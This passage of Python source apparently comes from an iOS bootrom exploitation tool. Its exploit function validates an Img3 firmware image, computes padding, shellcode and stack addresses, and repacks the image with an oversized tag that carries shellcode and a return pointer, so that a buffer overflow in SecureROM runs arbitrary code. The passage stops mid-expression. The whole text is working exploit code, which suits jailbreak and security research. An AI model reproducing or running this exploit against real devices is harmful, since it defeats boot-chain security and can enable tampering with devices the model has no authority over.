...
def exploit(img3, securerom):
    ...
    (img3_magic, total_size, data_size, signed_size,
     magic) = struct.unpack('<4s3I4s', img3[:20])
    assert img3_magic == 'Img3'[
        ::-
        1] and signed_size != 0 and magic == 'illb'[
        ::-
        1]
    assert total_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12
    assert data_size < 0x24000 - \
        (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20
    assert signed_size < 0x24000 - \
        (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20
    assert 20 + signed_size + \
        4 <= len(img3) and img3[20 + signed_size:20 + signed_size + 4] == 'SHSH'[::-1]

    PADDING = 0x24000 - (4 + 12 + 64 + 12 + 12) - \
        len(shellcode) - (20 + signed_size + 12)
    SHELLCODE_ADDRESS = 0x84000000 + 1 + (20 + signed_size + 12 + PADDING)
    STACK_ADDRESS = 0x84033EA4
    img3 = struct.pack('<4s3I4s',
                       'Img3'[::-1],
                       0x24200,
                       0x241BC,
                       0x23F88,
                       'illb'[::-1]) + img3[20:20 + signed_size] + struct.pack('4s2I%sx' % PADDING,
                                                                               '24KP'[::-1],
                                                                               12 + PADDING + len(shellcode) + 4,
                                                                               PADDING + len(shellcode) + 4) + shellcode + struct.pack('<I4s2I64x4s2I',
                                                                                                                                       SHELLCODE_ADDRESS,
                                                                                                                                       'SHSH'[::-1],
                                                                                                                                       12 + 64,
                                                                                                                                       64,
